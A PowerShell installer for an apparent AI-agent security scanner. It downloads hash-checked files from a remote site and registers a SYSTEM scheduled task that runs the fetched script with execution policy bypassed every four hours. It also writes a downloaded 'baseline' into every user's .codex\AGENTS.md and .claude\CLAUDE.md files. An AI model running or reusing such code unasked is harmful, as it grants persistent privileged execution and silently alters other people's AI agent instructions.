$ErrorActionPreference = 'Stop'
$baseUrl = 'https://sentinel-agent-security.yjiod2022.chatgpt.site/downloads'
$installDir = Join-Path $env:ProgramData 'SentinelAgent'
$reportDir = Join-Path $installDir 'reports'
$previousDir = Join-Path $installDir 'previous'
$stageDir = Join-Path $installDir ('.stage-' + [Guid]::NewGuid().ToString('N'))
$expected = @{ 'sentinel-policy.json'='0f87d2ecdc801505d825c647ef8eced290bc9ba9e0bd17b4abe9b6a7a4d14423'; 'sentinel-windows.ps1'='6e9d9d5165d562a311a97d7dbd2b49fa1dd08386eb36e63ced46346d94d689aa'; 'sentinel-security-baseline.md'='e6d87dba8756aa270a70f423368bf68a44f108a5a299ab2a62c4488ed74a962e' }
New-Item -ItemType Directory -Force -Path $installDir,$reportDir,$previousDir,$stageDir | Out-Null
& icacls.exe $installDir /inheritance:r /grant:r '*S-1-5-18:(OI)(CI)F' '*S-1-5-32-544:(OI)(CI)F' /T /C | Out-Null
try {
  foreach ($name in $expected.Keys) { Invoke-WebRequest "$baseUrl/$name" -OutFile (Join-Path $stageDir $name) -UseBasicParsing -TimeoutSec 120 }
  foreach ($name in $expected.Keys) { if ((Get-FileHash (Join-Path $stageDir $name) -Algorithm SHA256).Hash.ToLower() -ne $expected[$name]) { throw "Integrity verification failed: $name" } }
  $currentComplete=@($expected.Keys|Where-Object {-not (Test-Path (Join-Path $installDir $_))}).Count -eq 0
  if($currentComplete){
    $previousStage=Join-Path $installDir ('.previous-stage-' + [Guid]::NewGuid().ToString('N'));$previousOld=Join-Path $installDir ('.previous-old-' + [Guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $previousStage|Out-Null;$backupHashes=@{}
    foreach($name in $expected.Keys){$current=Join-Path $installDir $name;Copy-Item $current (Join-Path $previousStage $name);$backupHashes[$name]=(Get-FileHash $current -Algorithm SHA256).Hash.ToLower()}
    $backupHashes|ConvertTo-Json|Set-Content (Join-Path $previousStage 'checksums.json') -Encoding UTF8
    Move-Item $previousDir $previousOld
    try{Move-Item $previousStage $previousDir}catch{Move-Item $previousOld $previousDir;throw}
    Remove-Item $previousOld -Recurse -Force
  }
  foreach ($name in $expected.Keys) { Move-Item (Join-Path $stageDir $name) (Join-Path $installDir $name) -Force }
} finally { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }
$baseline = Get-Content (Join-Path $installDir 'sentinel-security-baseline.md') -Raw
$userBaselineStart='<!-- sentinel-managed-user-baseline:start -->';$userBaselineEnd='<!-- sentinel-managed-user-baseline:end -->'
$userBaselineBlock=$userBaselineStart+"`n"+$baseline.TrimEnd()+"`n"+$userBaselineEnd
Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | ForEach-Object {
  $targets=@()
  $codexDir=Join-Path $_.FullName '.codex';$claudeDir=Join-Path $_.FullName '.claude'
  if((Test-Path $codexDir) -and -not ((Get-Item $codexDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){$targets += Join-Path $_.FullName '.codex\AGENTS.md'}
  if(((Test-Path $claudeDir) -and -not ((Get-Item $claudeDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)) -or (Test-Path (Join-Path $_.FullName '.claude.json'))){$targets += Join-Path $_.FullName '.claude\CLAUDE.md'}
  foreach ($target in $targets) {
    New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
    if((Test-Path $target) -and ((Get-Item $target -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){continue}
    $existing=if(Test-Path $target){Get-Content $target -Raw}else{''}
    $pattern=[regex]::Escape($userBaselineStart)+'.*?'+[regex]::Escape($userBaselineEnd)
    if($existing.Contains($userBaselineStart) -xor $existing.Contains($userBaselineEnd)){Write-Output "Sentinel baseline markers malformed; preserving $target";continue}
    if($existing -match [regex]::Escape($userBaselineStart)){$updated=[regex]::Replace($existing,$pattern,[System.Text.RegularExpressions.MatchEvaluator]{param($match)$userBaselineBlock},[System.Text.RegularExpressions.RegexOptions]::Singleline)}
    else{$updated=$existing.TrimEnd()+$(if($existing.Trim()){"`n`n"}else{''})+$userBaselineBlock+"`n"}
    if($updated -ne $existing){Set-Content -Encoding UTF8 $target $updated}
  }
}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$installDir\sentinel-windows.ps1`" -Output `"$reportDir\latest.json`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 4)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'Sentinel AI Agent Security Scan' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Write-Output 'Sentinel Agent installed and scheduled.'
